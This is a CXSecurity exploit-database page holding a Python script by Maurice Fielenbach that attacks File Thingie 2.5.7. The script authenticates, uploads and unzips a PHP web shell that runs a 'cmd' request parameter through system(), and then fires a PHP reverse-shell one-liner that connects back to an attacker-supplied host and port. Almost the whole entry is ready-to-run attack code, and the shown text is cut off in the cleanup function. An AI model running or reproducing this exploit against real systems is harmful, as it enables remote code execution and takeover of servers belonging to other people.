---
title: File Thingie 2.5.7 Shell Upload
url: https://cxsecurity.com/issue/WLB-2023050020
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-05-09
fetch_date: 2025-10-04T11:36:42.234154
---

# File Thingie 2.5.7 Shell Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **File Thingie 2.5.7 Shell Upload** **2023.05.08**  Credit:  **[Maurice Fielenbach](https://cxsecurity.com/author/Maurice%2BFielenbach/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

#!/usr/bin/python
# Exploit Title: File Thingie 2.5.7 - Remote Code Execution (RCE)
# Google Dork: N/A
# Date: 27th of April, 2023
# Exploit Author: Maurice Fielenbach (grimlockx) - Hexastrike Cybersecurity UG (haftungsbeschränkt)
# Software Link: https://github.com/leefish/filethingie
# Version: 2.5.7
# Tested on: N/A
# CVE: N/A
# Vulnerability originally discovered / published by Cakes
# Reference: https://www.exploit-db.com/exploits/47349
# Run a local listener on your machine and youre good to go
import os
import argparse
import requests
import random
import string
import zipfile
from urllib.parse import urlsplit, urlunsplit, quote
class Exploit:
def \_\_init\_\_(self, target, username, password, lhost, lport):
self.target = target
self.username = username
self.password = password
self.lhost = lhost
self.lport = lport
def try\_login(self) -> bool:
self.session = requests.Session()
post\_body = {"ft\_user": f"{self.username}", "ft\_pass": f"{self.password}", "act": "dologin"}
response = self.session.post(self.target, data=post\_body)
if response.status\_code == 404:
print(f"[-] 404 Not Found - The requested resource {self.target} was not found")
return False
elif response.status\_code == 200:
if "Invalid username or password" in response.text:
print(f"Invalid username or password")
return False
return True
def create\_new\_folder(self) -> bool:
# Generate random string
letters = string.ascii\_letters
self.payload\_filename = "".join(random.choice(letters) for i in range(16))
headers = {"Content-Type": "application/x-www-form-urlencoded"}
post\_body = {f"type": "folder", "newdir": f"{self.payload\_filename}", "act": "createdir", "dir": "", "submit" :"Ok"}
print(f"[\*] Creating new folder /{self.payload\_filename}")
response = self.session.post(self.target, headers=headers, data=post\_body)
if f"index.php?dir=/{self.payload\_filename}" in response.text:
print(f"[+] Created new folder /{self.payload\_filename}")
return True
else:
print(f"[-] Could not create new folder /{self.payload\_filename}")
return False
def create\_payload(self) -> bool:
try:
with zipfile.ZipFile(f"{self.payload\_filename}.zip", 'w', compression=zipfile.ZIP\_DEFLATED) as zip\_file:
zip\_file.writestr(f"{self.payload\_filename}.php", "<?php if(isset($\_REQUEST[\'cmd\'])){ echo \"<pre>\"; $cmd = ($\_REQUEST[\'cmd\']); system($cmd); echo \"</pre>\"; die; }?>")
print(f"[+] Zipped payload to {self.payload\_filename}.zip")
return True
except:
print(f"[-] Could not create payload to {self.payload\_filename}.zip")
return False
def upload\_payload(self) -> bool:
# Set up the HTTP headers and data for the request
headers = {
b'Content-Type': b'multipart/form-data; boundary=---------------------------grimlockx'
}
post\_body = (
'-----------------------------grimlockx\r\n'
'Content-Disposition: form-data; name="localfile-1682513975953"; filename=""\r\n'
'Content-Type: application/octet-stream\r\n\r\n'
)
post\_body += (
'\r\n-----------------------------grimlockx\r\n'
'Content-Disposition: form-data; name="MAX\_FILE\_SIZE"\r\n\r\n'
'2000000\r\n'
'-----------------------------grimlockx\r\n'
f'Content-Disposition: form-data; name="localfile"; filename="{self.payload\_filename}.zip"\r\n'
'Content-Type: application/zip\r\n\r\n'
)
# Read the zip file contents and append them to the data
with open(f"{self.payload\_filename}.zip", "rb") as f:
post\_body += ''.join(map(chr, f.read()))
post\_body += (
'\r\n-----------------------------grimlockx\r\n'
'Content-Disposition: form-data; name="act"\r\n\r\n'
'upload\r\n'
'-----------------------------grimlockx\r\n'
'Content-Disposition: form-data; name="dir"\r\n\r\n'
f'/{self.payload\_filename}\r\n'
'-----------------------------grimlockx\r\n'
'Content-Disposition: form-data; name="submit"\r\n\r\n'
'Upload\r\n'
'-----------------------------grimlockx--\r\n'
)
print("[\*] Uploading payload to the target")
response = self.session.post(self.target, headers=headers, data=post\_body)
if f"<a href=\"./{self.payload\_filename}/{self.payload\_filename}.zip\" title=\"Show {self.payload\_filename}.zip\">{self.payload\_filename}.zip</a>" in response.text:
print("[+] Uploading payload successful")
return True
else:
print("[-] Uploading payload failed")
return False
def get\_base\_url(self) -> str:
url\_parts = urlsplit(self.target)
path\_parts = url\_parts.path.split('/')
path\_parts.pop()
base\_url = urlunsplit((url\_parts.scheme, url\_parts.netloc, '/'.join(path\_parts), "", ""))
return base\_url
def unzip\_payload(self) -> bool:
print("[\*] Unzipping payload")
headers = {"Content-Type": "application/x-www-form-urlencoded"}
post\_body = {"newvalue": f"{self.payload\_filename}.zip", "file": f"{self.payload\_filename}.zip", "dir": f"/{self.payload\_filename}", "act": "unzip"}
response = self.session.post(f"{self.target}", headers=headers, data=post\_body)
if f"<p class='ok'>{self.payload\_filename}.zip unzipped.</p>" in response.text:
print("[+] Unzipping payload successful")
print(f"[+] You can now execute commands by opening {self.get\_base\_url()}/{self.payload\_filename}/{self.payload\_filename}.php?cmd=<command>")
return True
else:
print("[-] Unzipping payload failed")
return False
def execute\_payload(self) -> bool:
print("[\*] Trying the get a reverse shell")
cmd = quote(f"php -r \'$sock=fsockopen(\"{self.lhost}\",{self.lport});system(\"/bin/bash <&3 >&3 2>&3\");\'")
print("[\*] Executing payload")
response = self.session.get(f"{self.get\_base\_url()}/{self.payload\_filename}/{self.payload\_filename}.php?cmd={cmd}")
print("[+] Exploit complete")
return True
def cleanup\_local\_files(self) -> bool:
if os.path.exists(f"{self.payload\_filename}.zip"):
os.remove(f"{self.payload\_filename}.zip")
print("[+] Cleaned up zipped payload on local machine")
return True
print("[-] Could not clean up zipped payload on loc...